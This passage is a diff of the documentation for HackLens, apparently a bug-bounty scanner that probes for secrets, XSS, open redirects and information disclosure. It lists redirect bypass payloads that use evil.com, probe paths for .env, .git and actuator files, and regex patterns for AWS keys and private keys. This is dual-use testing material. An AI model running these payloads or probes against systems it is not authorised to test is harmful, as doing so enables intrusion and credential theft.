 | `https://evil.com@target.com` | Credential confusion |
 | `https://target.com@evil.com` | Reversed credential confusion |
 | `https://evil.com%23.target.com` | Fragment confusion |
 
-### 3-Layer Detection Algorithm
+### 3 Detection Layers
 
-```
-For each parameter (redirect-likely OR value looks like URL):
-│
-├── LAYER 1: Raw Location Header
-│   ├── GET url (allow_redirects=False)
-│   ├── IF status 301/302/303/307/308:
-│   │   ├── Parse Location header netloc
-│   │   ├── IF netloc == evil.com → CONFIRMED
-│   │   ├── IF netloc is off-target AND not benign pair → CONFIRMED
-│   │   └── IF netloc is on-target (app.target.com) → FALSE POSITIVE → SKIP
-│   └── IF status 200 → check body (Layer 2)
-│
-├── LAYER 2: Response Body JS Sinks
-│   ├── IF Content-Type has "html":
-│   │   ├── window.location.href = "..evil.com.." → POSSIBLE
-│   │   ├── window.location.replace("..evil.com..") → POSSIBLE
-│   │   ├── location.href = "..evil.com.." → POSSIBLE
-│   │   ├── <form action="..evil.com.."> → POSSIBLE
-│   │   ├── <meta http-equiv=refresh url=..evil.com..> → CONFIRMED
-│   │   └── <a href="..evil.com.."> → SKIP (passive link, not a redirect)
-│   └── (Only active redirect sinks trigger findings)
-│
-└── LAYER 3: Redirect Chain
-    ├── GET url (allow_redirects=True, max_redirects=8)
-    ├── Check final r.url netloc == evil.com → CONFIRMED
-    └── Check every Location in r.history for evil.com or off-site → CONFIRMED
-```
+**Layer 1 — Raw Location Header (`allow_redirects=False`)**
+- Status 301/302/303/307/308
+- Parse `Location` netloc
+- Must equal `evil.com` exactly
 
-### Key Distinction — Why Previous Version Had FPs
+**Layer 2 — Response Body JS Sinks**
+Active sinks only: `window.location.href=`, `window.location.replace()`, `window.location.assign()`, `<meta http-equiv=refresh>`, `<form action>`
+NOT reported: `<a href>` (passive — requires user click → ONE-CLICK LOW)
 
-```
-❌ FALSE POSITIVE (old logic):
-   Location: https://app.target.com/login?next=https://evil.com
-   
-   The redirect destination is app.TARGET.COM (on-site)
-   evil.com only appears as a QUERY PARAM VALUE
-   The browser stays on target.com — not a redirect to evil.com
+**Layer 3 — Redirect Chain**
+Follow all hops, check every `Location` header for `evil.com` as host.
 
-✅ TRUE POSITIVE (new logic):
-   Location: https://evil.com/malicious
-   
-   The redirect destination HOST IS evil.com
-   Browser is actually sent to evil.com
-```
+### Severity
 
-### Parameter Selection
+| Finding | Meaning |
+|---------|---------|
+| `[CONFIRMED]` | Browser redirected to evil.com |
+| `[POSSIBLE]` | JS sink or meta-refresh found |
+| `[One-Click LOW]` | `<a href>` to evil.com — user must click |
 
-**Priority (tested first):**
-- `next`, `redirect`, `url`, `return`, `goto`, `dest`, `target`, `redir`, `redirect_uri`, `callback`, `back`, `continue`, `forward`, `out`, `exit`, etc.
-- Any param whose current value already starts with `http://`, `https://`, `//`, `www.`
+### Exclusions
 
-**Also tested:** All other params
-
-**Never tested (permanent exclusion):**
-`utm_source`, `utm_medium`, `utm_campaign`, `utm_term`, `q`, `search`, `filter`, `labels`, `id`, `slug`, `page`, `token`, `nonce`, `secret`, `format`, `lang`, `sort`, `order`, etc.
-
-**Proactive auth path testing:**
-Even if not crawled: `/login`, `/logout`, `/signin`, `/oauth/authorize`, `/sso`, `/redirect`, `/auth/callback`, etc.
-
-### Benign Redirect Whitelist
-```
-twitter.com  →  x.com           (domain migration)
-x.com        →  twitter.com
-fb.com       →  facebook.com    (shortlink)
-youtu.be     →  youtube.com     (shortlink)
-goo.gl       →  google.com      (shortlink)
-```
+Never tested: `utm_*`, `q`, `search`, `id`, `slug`, `page`, `token`, `nonce`, `secret`, `format`, `lang`, `sort`, `order`, `filter`, `labels`
 
 ---
 
-## 5. Scope Enforcement {#scope}
+## 5. Information Disclosure Scanner {#infodisclosure}
+
+### 70+ Probe Paths
+
+Categories: Spring Boot Actuator (13 endpoints), Laravel (Ignition/Telescope/Horizon), PHP (phpinfo), Config files (`.env` variants, YAML, JSON, XML), Source code (`.git`, `.svn`, package files), API Docs (Swagger, OpenAPI, GraphQL), Backup files (SQL dumps, ZIP archives), Admin panels, Log files.
+
+### 20+ Response Patterns
+
+| Pattern | Severity | Detects |
+|---------|----------|---------|
+| Python Traceback | HIGH | `Traceback (most recent call last)` |
+| PHP Error | HIGH | `Fatal error:... in /path on line N` |
+| Rails Exception | HIGH | `ActiveRecord::Exception` |
+| Django Debug | HIGH | `Django Version:` |
+| Java Stack Trace | HIGH | `com.sun.*Exception` |
+| Laravel Whoops | HIGH | `Whoops! Exception` |
+| Node.js Stack | HIGH | `at Module._compile (module.js:N:N)` |
+| Server Version | LOW | `Apache/2.4.x` in response |
+| X-Powered-By | LOW | Technology stack in header |
+| Private Key in Response | CRITICAL | `-----BEGIN ... PRIVATE KEY-----` |
+| AWS Key in Response | CRITICAL | `AKIA[A-Z0-9]{16}` |
+| Env Vars Exposed | CRITICAL | `DB_PASSWORD=`, `SECRET_KEY=` |
+| Credentials in Response | CRITICAL | `"password":"abc123"` |
+| Directory Listing | MEDIUM | `Index of /` |
+| Git Repo Exposed | HIGH | `ref: refs/heads/main` |
+| SQL Error | HIGH | `mysql_fetch`, `ORA-00001` |
+| phpinfo() | HIGH | `<title>phpinfo()` |
+| API Docs | MEDIUM | `"swagger":"3.0"`, `"openapi":"3.0"` |
+| GraphQL Introspection | MEDIUM | `"__schema"` |
+| Spring Boot Actuator | HIGH | `"activeProfiles":`, `"beans":[` |
+| SQL Dump | CRITICAL | `INSERT INTO ... VALUES` |
+| Internal Path | MEDIUM | `/var/www/html/config.php` |
+
+---
+
+## 6. Subdomain Enumeration {#subdomains}
+
+### Sources
+
+**API (no install, no key):**
+crt.sh, HackerTarget, RapidDNS, AlienVault OTX, URLScan.io, ThreatCrowd, DNSDumpster (scrape)
+
+**Tools (installed by install.sh):**
+Subfinder (`-all`, 180s), Assetfinder (60s), Amass passive (300s), Chaos (60s, needs API key)
+
+**Optional bruteforce:**
+MassDNS with SecLists top-5000 DNS wordlist
+
+**Post-collection:**
+httpx alive check → saves `alive_subdomains.txt` separately
+
+### Tool Timeouts
+
+| Tool | Timeout | Why |
+|------|---------|-----|
+| Subfinder | 180s | Fast, multiple sources |
+| Assetfinder | 60s | Single source |
+| Amass | 300s | Many sources, slow but thorough |
+| Chaos | 60s | Fast API |
+| MassDNS | 120s | DNS bruteforce |
+
+---
+
+## 7. Scope Enforcement {#scope}
 
 ```python
 def is_in_scope(url, target_domain):
@@ -358,160 +480,113 @@ def is_in_scope(url, target_domain):
     return host == target_domain or host.endswith("." + target_domain)
 ```
 
-Applied at every level:
+Applied at: Secret scanner, XSS scanner, Redirect scanner, crawled-urls.txt, endpoints.txt
 
-| Layer | Enforcement |
-|-------|-------------|
-| Secret scanner | `scan_url()` returns early if not in scope |
-| XSS scanner | `_test_param()` returns early if not in scope |
-| Redirect scanner | `_test_param()` returns early if not in scope |
-| `crawled-urls.txt` | In-scope only |
-| `crawled-urls-outofscope.txt` | Out-of-scope (separate file) |
-| `endpoints.txt` | In-scope + relative paths only |
-| Scan targets | `js_inscope` + `pages_inscope` filter applied |
+**`-l` mode:** scope filter disabled — user owns the list.
 
 ---
 
-## 6. False Positive Filtering {#fp}
+## 8. False Positive Filtering {#fp}
 
-Every regex match passes through a multi-layer FP filter before reporting:
+Applied to every regex match before reporting:
 
-### Code Reference Filter
-Blocks JS property accesses that aren't real values:
-```
-this. / self. / config. / options. / process.env
-window. / document. / ${}  (template literal)
-function( / => / new Class / .prototype.
-import / require( / return / typeof
-```
-
-### Placeholder Filter
-```
-your_ / <token> / [placeholder] / example / dummy
-changeme / replace_me / test123 / n/a / undefined
-myapikey / here (at end) / INSERT_ / ENTER_
-```
-
-### Entropy Filter
-Values with ≤ 3 unique characters in 10+ char string (e.g. `aaaaaaaaaa`, `01010101`) → filtered.
-
-### JS Identifier Filter
-Pure `camelCase` or `snake_case` under 32 chars → filtered (it's a variable name, not a secret).
-
-### Version String Filter
-`1.0.0`, `2.3.1-beta` → filtered.
-
-### Per-Pattern Filters
-- JWT: must have exactly 3 parts with adequate lengths
-- Bearer: value must not be a plain alphanumeric identifier
-- Password: must have mixed character classes (upper + lower + digit/special)
-- Telegram: bot ID must be 8-10 digits exactly
-- Basic Auth: password must contain at least one non-alpha character
+1. **Code reference** — `this.`, `process.env`, `${}`, `function(`, `import`, `require(`
+2. **Placeholder** — `your_`, `<token>`, `changeme`, `replace_me`, `test123`, `example`
+3. **Low entropy** — ≤ 3 unique chars in 10+ char value
+4. **JS identifier** — pure `camelCase`/`snake_case` under 32 chars
+5. **Version string** — `1.0.0`, `2.3.1-beta`
+6. **Data URI** — anything starting with `data:image/`, `data:font/` etc.
+7. **Raw base64 blob** — 80+ chars of pure `[A-Za-z0-9+/=]` (not in known pattern list)
+8. **Per-pattern** — JWT needs valid 3-part structure, password needs mixed char classes
 
 ---
 
-## 7. Output Reference {#output}
+## 9. Memory Management {#memory}
 
-### File Structure
+| File Size | Strategy | RAM Used |
+|-----------|----------|----------|
+| < 512 KB JS | jsbeautifier + scan | ~5x file size |
+| > 512 KB any | Raw scan, 2MB chunks, 500-byte overlap | ~2MB constant |
+| Binary (image/font/zip/pdf) | Skip entirely | 0 |
+
+**Batch processing:** 200 URLs per batch, `gc.collect()` between batches.
+
+**Workers:** Default 5 (keeps RAM manageable). Increase with `-w` for faster scans on machines with more RAM.
+
+---
+
+## 10. Output Reference {#output}
+
+### `-d` mode folder structure
 ```
 target.com/
   secrets_YYYYMMDD_HHMMSS.json
   report_YYYYMMDD_HHMMSS.html
   total_subdomains.txt
+  alive_subdomains.txt
   crawled-urls.txt
   crawled-urls-outofscope.txt
   endpoints.txt
+```
+
+### `-l` mode folder structure
+```
+target-urlscan/
+  secrets_YYYYMMDD_HHMMSS.json
+  report_YYYYMMDD_HHMMSS.html
 ```
 
 ### JSON Schema
 ```json
 {
   "domain": "target.com",
-  "timestamp": "20260411_230435",
+  "timestamp": "20260501_143022",
   "secrets": {
-    "total": 8,
-    "findings": [
-      {
-        "type": "AWS Access Key",
-        "severity": "CRITICAL",
-        "value": "AKIAIOSFODNN7EXAMPLE",
-        "source": "https://target.com/static/js/main.chunk.js",
-        "line": 1247
-      }
-    ]
+    "total": 3,
+    "findings": [{"type":"AWS Access Key","severity":"CRITICAL","value":"AKIA...","source":"https://...","line":1247}]
   },
   "xss": {
     "total": 1,
-    "findings": [
-      {
-        "type": "Reflected XSS",
-        "url": "https://target.com/search?query=...",
-        "param": "query",
-        "detail": "Context: html_body | Payload verified",
-        "evidence": "PoC: https://..."
-      }
-    ]
+    "findings": [{"type":"Reflected XSS","url":"https://...","param":"q","detail":"Context: html_body","evidence":"PoC: https://..."}]
   },
   "redirects": {
     "total": 1,
-    "findings": [
-      {
-        "type": "Open Redirect [CONFIRMED]",
-        "url": "https://target.com/logout?next=https://evil.com",
-        "param": "next",
-        "detail": "off-site Location header | HTTP 302",
-        "evidence": "Location: https://evil.com"
-      }
-    ]
+    "findings": [{"type":"Open Redirect [CONFIRMED]","url":"https://...","param":"next","detail":"Location header","evidence":"Location: https://evil.com"}]
+  },
+  "information_disclosure": {
+    "total": 2,
+    "findings": [{"type":"[HIGH] Django Debug Mode","url":"https://...","detail":"Django DEBUG=True","evidence":"Django Version: 4.2"}]
   }
 }
 ```
 
 ### Severity Levels
 
-| Severity | Patterns |
-|----------|---------|
-| CRITICAL | AWS keys, Stripe live, RSA/EC/PGP/OpenSSH private keys, OpenAI, Anthropic, MongoDB/PostgreSQL/MySQL URIs, JWT, GitHub, GitLab |
-| HIGH | Google API, Slack, Discord, SendGrid, S3, Generic Access Token, Sentry DSN, NPM, Stripe Test, HuggingFace |
-| MEDIUM | Webhooks, Heroku, Firebase, Shopify, Algolia, Vault, CI/CD tokens, SaaS platform keys |
-| LOW | Hardcoded passwords, Internal IPs, Basic Auth URLs, Database passwords |
-| INFO | AWS ARNs, Service account references |
+| Level | Patterns |
+|-------|---------|
+| CRITICAL | AWS keys, Stripe live, all private keys, OpenAI, Anthropic, DB URIs with creds, JWT, OAuth Client Secret, Master Key, AES Key, Admin Password, Encryption Password, GCP SA, SQL Dump |
+| HIGH | Google API, Slack tokens, SendGrid, S3, GitHub, Refresh Token, SMTP Password, LDAP, CamelCase secrets, JS Object credentials, Spring Boot Actuator, Git exposure |
+| MEDIUM | Webhooks, Firebase, Session ID, Shopify, Algolia, CamelCase tokens, JS Object tokens, API Docs, GraphQL introspection |
+| LOW | MySQL Server, Internal IPs, Azure Client ID, Certificate, SMTP Host, .env file exposure |
+| INFO | Stripe test keys |
 
 ---
 
-## 8. Roadmap {#roadmap}
+## 11. Roadmap {#roadmap}
 
-### Planned Features
+### Planned
 
-#### Advanced XSS Detection
-- DOM-based XSS (injecting into `innerHTML`, `document.write`, `eval`)
-- Stored XSS indicators (finding injection points that persist)
-- Blind XSS (Burp Collaborator-style callback)
-- CSP bypass detection
+**Advanced XSS:** DOM-based XSS, stored XSS indicators, blind XSS (callback-based), CSP bypass detection
 
-#### SSRF Detection
-- Injecting internal IP probes into URL parameters
-- Cloud metadata endpoint probing (`169.254.169.254`)
-- DNS-based SSRF confirmation
+**SSRF Detection:** Inject internal IP probes, cloud metadata endpoint probing (`169.254.169.254`), DNS-based confirmation
 
-#### WAF Evasion
-- Automatic payload encoding variants
-- Case randomization
-- HTML entity encoding
-- Unicode normalization bypass
+**WAF Evasion:** Automatic payload encoding variants, case randomization, Unicode normalization bypass
 
-#### Command Injection
-- OS command injection via `;`, `|`, `&&`, backticks
-- Blind command injection via time delays
-- Out-of-band confirmation
+**Command Injection:** OS command via `;`, `|`, `&&`, time-delay blind detection
 
-#### SQL Injection
-- Error-based SQLi detection
-- Boolean-based blind SQLi
-- Time-based blind SQLi
-- Detection across GET/POST parameters
+**SQL Injection:** Error-based, boolean-based blind, time-based blind
 
 ---
 
-*HackLens — Created by Yogesh Bhandage | yogeshbhandage.com*
+*HackLens v2.1 — Yogesh Bhandage | yogeshbhandage.com*
 *Built with AI using original ideas by the author. Hunt responsibly. 🎯*
